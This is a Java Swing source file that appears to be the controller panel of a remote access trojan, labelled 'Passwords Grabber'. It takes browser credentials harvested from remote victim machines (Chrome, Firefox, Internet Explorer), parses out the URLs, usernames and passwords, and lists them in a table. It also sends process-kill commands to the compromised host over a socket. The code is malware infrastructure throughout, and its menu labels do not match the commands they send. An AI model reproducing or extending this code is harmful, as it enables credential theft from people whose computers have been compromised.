package New;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.util.ArrayList;

import javax.swing.*;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;
public class Password_Viewer {
	private  JFrame form ;
	private  JTable j; 
	private    JScrollPane sp;
    private  JPopupMenu popupMenu;
    private  JMenuItem menuItem_Run_File;
    private  JMenuItem menuItem_Run_File2;
    private  JMenuItem menuItem_Run_File3;
    private  JMenuItem Refresh_menuitem;
 

	private  String Exe_Split = "fxf0x4x4x0fxf";
	private  String Exe_Ending = "c2x2824x828200x0c";
	private  String Jar_Split = "fxf0x4x4x0fxf";
	private  String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
    private  String title = "";
 
	
	
	public Password_Viewer(String ip){
		this.sock = ip;
	 
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public String Get_sock(){
		return sock ;
	}
	public void command(){
		try{	get_row_index();}
		catch(Exception x){}
		  sock = title.replace("Passwords Grabber For : "  , "");
	 
	//Master.Send_Data("getproc" + Exe_Split + Exe_Ending,sock);
	}
	 class CellRenderer implements TableCellRenderer {
		 
	        @Override
	        public Component getTableCellRendererComponent(JTable table,
	                Object value,
	                boolean isSelected,
	                boolean hasFocus,
	                int row,
	                int column) {
	 
	            TableColumn tb = j.getColumn("Image");
	            tb.setMaxWidth(60);
	            tb.setMinWidth(60);
	 
	            j.setRowHeight(60);
	 
	            return (Component) value;
	        }
	 
	    }
	public void yourAddRow(String str0,String str1, String str2, String str3 ,String str4){
		  DefaultTableModel Model = (DefaultTableModel) j.getModel();
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					 
			 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
			 	    		return;
			 	    	}
			 	      }
			 	}
			 if(str0 == "#"){
				 //Drive icon
				// CellRenderer CellRenderer = new CellRenderer();
				// j.getColumn("Image").setCellRenderer(CellRenderer);
				 ImageIcon icon=new ImageIcon(Master.class.getResource("paws.png"));
				 
				  Model.addRow(new Object[]{icon,str1, str2, str3,str4});
			 }else  if(str0 == "$"){
				 //Folder icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("folder.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,str4});
			 }else  if(str0 == "@"){
				 //File icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("file.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,str4});
			 }
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					  j.setRowHeight(row, 25);
					   
			 	      }
			 	}
			 TableColumnModel columnModel = j.getColumnModel();
			  columnModel.getColumn(0).setMaxWidth(25);
			// setColumnWidths(j,0);
		 //IP is 2nd column
		   
		}
	public static void setColumnWidths(JTable table, int... widths) {
	    TableColumnModel columnModel = table.getColumnModel();
	    for (int i = 0; i < widths.length; i++) {
	        if (i < columnModel.getColumnCount()) {
	            columnModel.getColumn(i).setMaxWidth(widths[i]);
	        }
	        else break;
	    }
	}
	 private static  ArrayList<String> SplitString(String s){
		 String Word = "";
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  ArrayList<String> SplitString_D(String s,String Delimeter){
		 String Word = "";
		 
		 String YY = Delimeter;
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  String convertSize(float iSize)
	 {
	   if (iSize <= 0.0F) {
	     return "0";
	   }
	   
	   String[] units = { "Bytes", "KB", "MB", "GB", "TB" };
	   int digitGroups = (int)(Math.log10(iSize) / Math.log10(1024.0D));
	   
	   return new java.text.DecimalFormat("#,##0.#")
	     .format(iSize / Math.pow(1024.0D, digitGroups)) + 
	     " " + units[digitGroups];
	 }
	public  void Perform_data(String Received){
		 form.setTitle("Passwords Grabber For : " + sock);
		 form.repaint();
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		//  System.out.println("here          " + Received );
			if (Received.isEmpty()==false){
				 
					Received = Received.replace("c2x2824x828200x0c", YY);
					
					  switch (SplitString(Received).get(0)){
					  case "result_pass":
					  case "result_pass_err":
						  String all_data_r = SplitString(Received).get(2);
						  String[] pass_liner =all_data_r.split("liner_split"); 
						  try{
							  String URL = "";
								 String Username = "";
								 String Password ="";
								 String Extra_info ="";  
								
						  for (String p_line : pass_liner){
						
							  if(p_line.contains("Username:")||p_line.contains("Site:")||p_line.contains("Website:")||p_line.contains("WebSite:")||p_line.contains("User Name         ")||p_line.contains("Password:")||p_line.contains("passwords")||p_line.contains("Passwords")){
								  
								  if(p_line.contains("Site:")){
									  p_line = p_line.replace("Site:", "");
									  URL = p_line.substring(1,p_line.length()-1);
								  }
								  if(p_line.contains("Website:")){
									  p_line = p_line.replace("Website:", "");
									  URL = p_line.substring(1,p_line.length()-1);
								  }
								  if(p_line.contains("WebSite:")){
									  p_line = p_line.replace("WebSite:", "");
									  URL = p_line.substring(1,p_line.length()-1);
								  }
								  if(p_line.contains("WebSite:")){
									  p_line = p_line.replace("WebSite:", "");
									  URL = p_line.substring(1,p_line.length()-1);
								  }
								  if(p_line.contains("passwords")){
									   if(p_line.contains("IE")||p_line.contains("Internet Explor")){
										
									  Extra_info = p_line.substring(2,p_line.length()-1).replace("-", "");
								  }
									   if(p_line.contains("Chrome")||p_line.contains("Google")){
											
											  Extra_info = p_line.substring(2,p_line.length()-1).replace("-", "");
										  }else if(p_line.contains("fox")||p_line.contains("Fire")||p_line.contains("fire")){
											
											  Extra_info = p_line.substring(2,p_line.length()-1).replace("-", "");
										  }else{
											  Extra_info = p_line.substring(2,p_line.length()-1).replace("-", "");
										
										  }
										  Extra_info = Extra_info.replace("passwords", "");
								  }
								 
								  if(p_line.contains("Username:")){
									  p_line = p_line.replace("Username:", "");
									  Username= p_line.substring(1,p_line.length()-1);
								  }
								  if(p_line.contains("Password:")){
									  p_line = p_line.replace("Password:", "");
									  Password= p_line.substring(1,p_line.length()-1);
								  }
							 
								  System.out.println("herex doing pass part" + p_line );
							  }else if(p_line.contains("Password") && p_line.contains("found")){
								    try{
								  if (Username.length()>1){
									  if (Password.length()>1){
										  
									  yourAddRow("#",URL,Username ,Password  , Extra_info);
										 j.repaint();
										   URL = "";Username = "";Password ="";Extra_info ="";
									     sp.updateUI();
										 form.repaint();
									  }
								  }
								
							  }catch(Exception e){} 
								    
							  }
							  
							
							 
							  
						  }
						  }catch(Exception e){}
					  
						  
						  break;
					  case "get_passwords_data":
						 
							  String all_data = SplitString(Received).get(2);
							  String[] pass_lines =all_data.split("new_linex"); 
							  try{
								  String URL = "";
									 String Username = "";
									 String Password ="";
									 String Extra_info ="";
							  for (String p_line : pass_lines){
							
								  if(p_line.contains("URL               ")||p_line.contains("Web Browser       ")||p_line.contains("User Name         ")||p_line.contains("Password          ")){
									  
									  if(p_line.contains("URL               ")){
										  p_line = p_line.replace("URL               ", "");
										  URL = p_line.substring(2,p_line.length()-1);
									  }
									  if(p_line.contains("Web Browser       ")){
										  p_line = p_line.replace("Web Browser       ", "");
										  Extra_info = p_line.substring(2,p_line.length()-1);
									  }
									  if(p_line.contains("User Name         ")){
										  p_line = p_line.replace("User Name         ", "");
										  Username= p_line.substring(2,p_line.length()-1);
									  }
									  if(p_line.contains("Password          ")){
										  p_line = p_line.replace("Password          ", "");
										  Password= p_line.substring(2,p_line.length()-1);
									  }
								 
									  System.out.println("here" + p_line );
								  }else if(p_line.contains("Password Field")){
									    try{
									  
									
										  yourAddRow("#",URL,Username ,Password  , Extra_info);
											 j.repaint();
											   URL = "";Username = "";Password ="";Extra_info ="";
										     sp.updateUI();
											 form.repaint();
								  }catch(Exception e){} 
									    
								  }
								  
								
								 
								  
							  }
							  }catch(Exception e){}
						  
						  
						 
						  break;
						  
					 
						  
					 
					  }
					
				 
					
				
			}
				
		
	}
	private  boolean isNumeric(String strNum) {
	    try {
	        double d = Double.parseDouble(strNum);
	    } catch (NumberFormatException | NullPointerException nfe) {
	        return false;
	    }
	    return true;
	}
	public  void Do_frame(){
		 form = new JFrame();
		 form.setName("Passwords Grabber For : " + sock);
		 form.setTitle("Passwords Grabber For : "+ sock);
		 title = "Passwords Grabber For : " + sock;
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 
		  
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
			final JPopupMenu popupMenu = new JPopupMenu();
		     menuItem_Run_File = new JMenuItem("Copy URL"); 
		     menuItem_Run_File2 = new JMenuItem("Copy Username"); 
		     menuItem_Run_File3 = new JMenuItem("Copy Password"); 
		     Refresh_menuitem = new JMenuItem("Refresh");
		   
			popupMenu.add(Refresh_menuitem);
			popupMenu.add(menuItem_Run_File);
			popupMenu.add(menuItem_Run_File2);
			popupMenu.add(menuItem_Run_File3);
	
			 
			
			ImageIcon icon=new ImageIcon("Drive.png");
		    Object[] columnNames = {"","URL", "Login Username", "Password","Extra Data"}; 

			// adding it to JScrollPane 
	       /* for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }*/
	        model.setColumnIdentifiers(columnNames);
	      	j = new JTable(model); 
	      	 
	      	
	      	        
	        j.setBounds(5, 100, 485, 290); 
	        j.setComponentPopupMenu(popupMenu);
			 
	        
	        j.addMouseListener(new MouseAdapter() {
	        	public void mousePressed(MouseEvent e) {
	        	      showPopup(e);
	        	    }
	        	    public void mouseReleased(MouseEvent e) {
	        	      showPopup(e);
	        	    }
	        	    private void showPopup(MouseEvent e) {
	        	      if (e.isPopupTrigger()) {
	        	    	  popupMenu.show(e.getComponent(), e.getX(), e.getY());
	        	      }
	        	    }
	            public void mouseClicked(MouseEvent me) {
	               if (me.getClickCount() == 2) {     // to detect doble click events
	                  JTable target = (JTable)me.getSource();
	                  int row = target.getSelectedRow(); // select a row
	                  int column = target.getSelectedColumn(); // select a column
	                  String selected_Value_double_click =j.getModel().getValueAt(row, 1).toString();
	                  String item_type =j.getModel().getValueAt(row, 2).toString();
	                   
	                  
	                  
	               }
	            }
	         });
	        
	        
	        
	        Refresh_menuitem.addActionListener(new ActionListener() {
	        	
	  				public void actionPerformed(ActionEvent event) {
	  					//do here some stuff
	  					get_row_index();
	  					command();
		  		       }
	  			});
	        ImageIcon icon_cforit =  new ImageIcon(Master.class.getResource("/some_icons/" + "cp_passx.png" ));
	        
	        menuItem_Run_File.setIcon(icon_cforit);
	        menuItem_Run_File2.setIcon(icon_cforit);
	        menuItem_Run_File3.setIcon(icon_cforit);
	        
	        
	         
	        menuItem_Run_File.setBackground(Color.white);
	        menuItem_Run_File2.setBackground(Color.white);
	        menuItem_Run_File3.setBackground(Color.white);
	        Refresh_menuitem.setBackground(Color.white);
	        
	        Refresh_menuitem.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "refresh.png" )));
	        
   menuItem_Run_File.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 2).toString();
						sock = title.replace("Passwords Grabber For : "  , "");
						Master.Send_Data("kill_proc"  +  Exe_Split+  selected_item    +  Exe_Split + Exe_Ending , sock,false);
		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
		        		
		         
				}
			});
   menuItem_Run_File2.addActionListener(new ActionListener() {
   	
		public void actionPerformed(ActionEvent event) {
			//do here some stuff
				int selectedRow = j.getSelectedRow();
				String selected_item = j.getModel().getValueAt(selectedRow, 2).toString();
				sock = title.replace("Passwords Grabber For : "  , "");
				Master.Send_Data("kill_proc"  +  Exe_Split+  selected_item    +  Exe_Split  +"sudo_kill" +  Exe_Split + Exe_Ending , sock,false);
       		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
       		
        
		}
	});
   menuItem_Run_File3.addActionListener(new ActionListener() {
   	
		public void actionPerformed(ActionEvent event) {
			//do here some stuff
				int selectedRow = j.getSelectedRow();
				String selected_item = j.getModel().getValueAt(selectedRow, 2).toString();
				sock = title.replace("Passwords Grabber For : " , "");
				Master.Send_Data("kill_proc"  +  Exe_Split+  selected_item    +  Exe_Split  +"sig_kill" +  Exe_Split + Exe_Ending , sock,false);
       		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
       		
        
		}
	});
			
	    
			 
			
			
			
			
		    form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			 
			    	 if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to close Passwords Grabber "+ sock +" window?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			           Master.Remove_Form_Open_Password_Viewer(sock);
			        } 
			    }
			}); 
			
			
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
	 
		//	 form.add(btnNext);
			// form.add(Dir);
		        sp = new JScrollPane(j); 
		        j.setFont(fontx);
		        sp.setBounds(5, 100, 485, 290); 
		        form.setLayout(new BorderLayout());
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		      
		       
				   // spRight.setDividerSize(300);
				   // spRight.setContinuousLayout(true);
				    final JSplitPane split;

				    split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, Buttons,sp );
				   // split.setContinuousLayout(false);
				    split.setDividerSize(10);
				    split.setDividerLocation(120);
				    split.setOneTouchExpandable(true);
				    //form.add(split, BorderLayout.CENTER);
				    form.addComponentListener(new ComponentAdapter() {
				        public void componentResized(ComponentEvent componentEvent) {
				        	split.setDividerLocation(5);
				        	//Dir.setSize(form.getWidth()-10,Dir.getHeight() );
				        	split.validate();
				        	split.repaint();
				        }
				    });
				 //form.add(sp);
			        //form.add(leftSplitPane, BorderLayout.WEST);
			       // form.add(splitPane, BorderLayout.CENTER);
				 form.validate();
				 form.setResizable(true);
				    form.getContentPane().add(split, BorderLayout.CENTER);
		        
		        
		        
		        
		        
		        
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
			 this.command();
			
	}
	
	
	public void get_row_index(){
		 
		 DefaultTableModel dm = (DefaultTableModel) j.getModel();
		 int rowCount = dm.getRowCount();
		 //Remove rows one by one from the end of the table
		 for (int i = rowCount - 1; i >= 0; i--) {
		     dm.removeRow(i);
		 	j.repaint();
		 }
	}
	
}
